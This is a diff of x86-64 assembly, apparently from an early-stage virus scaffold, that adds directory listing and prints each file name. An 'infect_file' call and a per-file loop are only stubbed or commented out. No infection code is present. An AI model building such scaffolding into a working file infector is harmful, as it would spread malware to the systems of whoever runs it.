@@ -47,21 +47,64 @@ scaffold_start:
     push rsi
 
     syscall
+    cmp rax, 0
+    jl error
 
-    pop rax
+    pop rsi
+    add rax, rsi ; = this is the max value to be read
+
+    mov rdi, rsi ; rdi == current entry
+
+    xor rdx, rdx
+    push rdx ; push a 0 byte to the stack as a stop for the array of pointers
+
+.dir_loop
+    cmp rdi, rax ; rdi < rax ?
+    jge .dir_loop_end
+
+    xor rcx, rcx
+    mov rcx, rdi
+    add rcx, dirent.d_name
+    push rcx ; push the string value to the stack
+
+    xor rbx, rbx
+    mov bx, [rdi + dirent.d_reclen] ; load length
+    add rdi, rbx
+
+    jmp .dir_loop
 
 
+.dir_loop_end
 
-    mov ebx, [rax + dirent.d_reclen]
+.string_loop
+    pop rsi
+    cmp rsi, 0
+    je .string_loop_end
+
+    mov r15, rsp
+.inner_ahh
+    mov rax, 1
+    mov rdi, 1
+    ; rsi already set
+    mov rdx, 1
+    
+    syscall
+    inc rsi
     xor rax, rax
-    mov rax, dirent.d_name
+    mov al, byte [rsi]
+    cmp al, 0
+    jnz .inner_ahh
 
-
-
-
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [new_line]
+    mov rdx, 1
+    syscall
+    
+    jmp .string_loop
     ; Make a loop that runs per file
 
-
+.string_loop_end
 
 
     ; CALL .infect_file
@@ -110,5 +153,6 @@ mmap:
 fd_dir u64 0x0
 buffer u64 0x0    
 
-dir_path db "/tmp/test1", 0     
+new_line db 10
+dir_path db "/home/fbruggem/test", 0     
 scaffold_end:
